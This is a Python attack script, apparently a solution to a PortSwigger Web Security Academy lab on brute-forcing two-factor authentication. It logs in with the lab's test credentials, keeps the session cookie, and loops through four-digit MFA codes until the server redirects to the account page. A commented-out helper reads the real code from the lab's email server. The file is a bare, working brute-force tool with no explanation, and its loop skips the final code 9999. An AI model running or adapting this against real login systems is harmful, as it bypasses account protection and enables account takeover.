import requests

url = "https://0a4f009e04dfdc02c0e89f0900ea00f2.web-security-academy.net/login"
username = "wiener"
password = "peter"

def login(username,password):
    req = requests.Session()
    req = requests.post(url, data={"username": username, "password": password})
    cookie =  req.request.headers['Cookie'].split('=')[1]
    
    return req.url,cookie

def attack(url,cookie):
    for i in range(0,9999):
        opt = str(i).zfill(4)
        req = requests.post(url, data={"mfa-code": opt},cookies={'session': cookie})
        if req.url.split("/")[-1] == "my-account":
            print(f"\33[32m{opt} is the correct code\033[0m")
            break
        else:
            print(f"\33[31m {opt} not working\033[0m")
            continue

# for test login
def test(url,cookie):
    url_opt = "https://exploit-0aad00500492dc85c0859f320104003b.web-security-academy.net/email"
    req_to_opt = requests.get(url_opt)
    opt_for_test =  (req_to_opt.text.split("code is ")[1][0:4])
    req = requests.post(url, data={"mfa-code": opt_for_test},cookies={'session': cookie})
    # if req.url.split("/")[-1] == "my-account" then login successful
    print(req.url.split("/")[-1])

if __name__ == "__main__":
    url,cookie = login(username,password)
    attack(url,cookie)
    # test(url,cookie)
